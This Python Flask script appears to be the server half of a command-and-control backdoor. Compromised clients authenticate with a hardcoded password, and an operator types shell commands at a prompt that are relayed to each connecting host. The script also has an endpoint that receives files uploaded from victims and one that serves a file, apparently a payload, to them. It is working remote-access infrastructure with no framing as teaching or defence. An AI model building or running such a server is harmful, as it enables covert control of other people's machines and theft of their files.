from flask import Flask, request, send_file
import logging
import pathlib
import os


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app = Flask('app')



@app.route('/',methods=['POST','GET'])
def hello_world():
  if request.method == 'POST':
    if(request.json['auth']=='ama'):
      ip_addr = request.remote_addr
      if request.json['response']!='ilu':
        print(request.json['response'])
      else:
        print(f'Connection established with {ip_addr}')
      command = input(f'{ip_addr}~ : ')
      if command == 'clear':
        os.system('clear')
        command = 'cd'
      return {'command':command}
    else:
      return 'code loss'
  else:
    return 'hi its a joke'



@app.route('/file',methods=['POST','GET'])
def download_file():
  if request.method =='POST':
    f = request.files['file']
    f.save(f.filename)
    print('Massif~: Downloaded!')
    return 'Successfully uploaded!'
  return 'you are fail'



@app.route('/send/<path:filename>',methods=['POST','GET'])
def upload_file(filename):
  pat = pathlib.Path().absolute()
  path = str(pat)+'/raj.txt'
  print(path)
  return send_file(path)



if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080,debug=True)